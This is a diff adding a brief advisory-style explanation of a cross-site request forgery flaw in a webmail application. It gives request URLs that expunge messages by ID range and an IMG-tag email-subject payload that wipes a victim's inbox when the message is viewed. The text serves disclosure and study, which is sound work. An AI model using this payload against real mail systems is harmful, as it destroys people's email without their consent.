@@ -1,0 +1,13 @@
+The URL below would move all the messages with msgid between 0 and 1000000 to the trash:
+http[s]://www.example.com:[port]/cmd.msc?sid=&mbox=INBOX&cmd=move&argv=0:1000000&argv=Trash&argv=expunge
+
+The URL below would delete all the messages in the trash with msgid between 0 and 1000000:
+http[s]://www.example.com:[port]/cmd.msc?sid=&mbox=Trash&cmd=expunge&argv=0:1000000&argv=force
+
+It is easier for an attacker to assemble the above two HTML queries into a simple one that would achieve the same goal for him. So why not deleting
+the messages directly from the inbox instead of passing them to the trash and then deleting them?!
+The following HTTP query would do the job perfectly:
+http[s]://www.example.com:[port]/cmd.msc?sid=&mbox=INBOX&cmd=expunge&argv=0:1000000&argv=force
+
+So finally, what a hacker would do in a normal attack is to send the victim a message with the following subject:
+<IMG SRC=http[s]://www.example.com:[port]/cmd.msc?sid=&mbox=INBOX&cmd=expunge&argv=0:1000000&argv=force></IMG>
